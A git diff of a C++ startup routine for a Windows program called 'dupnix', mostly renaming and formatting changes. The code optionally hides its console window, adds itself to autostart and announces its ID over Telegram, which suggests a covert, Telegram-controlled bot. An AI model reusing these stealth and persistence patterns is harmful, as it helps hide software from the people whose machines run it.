@@ -1,17 +1,20 @@
+#include "startup.h"
+
 #include <iostream>
 #include <fstream>
 #include <Windows.h>
 #include <filesystem>
+
 #include <nlohmann/json.hpp>
+
 #include "tools.h"
-#include "startup.h"
 #include "globals.h"
 #include "telegram.h"
 #include "autostart.h"
 
 using json = nlohmann::json;
 
-void logo() {
+void printLogo() {
 	std::cout << "      _                   _      ____  " << std::endl
 		<< "     | |                 (_)    |___ \\ " << std::endl
 		<< "   __| |_   _ _ __  _ __  ___  __ __) |" << std::endl
@@ -25,7 +28,7 @@ void logo() {
 void load_data() {
 	json data = tools::load_cfg();
 
-	try {	
+	try {
 		AUTOSTART = data["autostart"];
 		HIDE_TERMINAL = data["hide_terminal"];
 
@@ -38,27 +41,24 @@ void load_data() {
 	catch (...) {
 		throw std::runtime_error("can't parse config file!");
 	}
-
 }
 
 void startup() {
-
-	std::filesystem::current_path(tools::get_path().substr(0, tools::get_path().size() - tools::get_exe().size()));
+	std::filesystem::current_path(tools::get_path().substr(0, tools::get_path().size() - tools::get_exe().size()));  // cd to the folder dupnix is inside
 	try {
 		load_data();
 	}
-	catch(...){
+	catch(...) {
 		std::cerr << "couldn't parse config file\n";
 		exit(1);
 	}
-
 
 	if (HIDE_TERMINAL)
 		ShowWindow(::GetConsoleWindow(), SW_HIDE);
 	if (AUTOSTART)
 		autostart();
 
-	logo();
+	printLogo();
 
 	telegram::SendText(ID + " is running");
 	std::cout << "\nID: " + ID << std::endl;
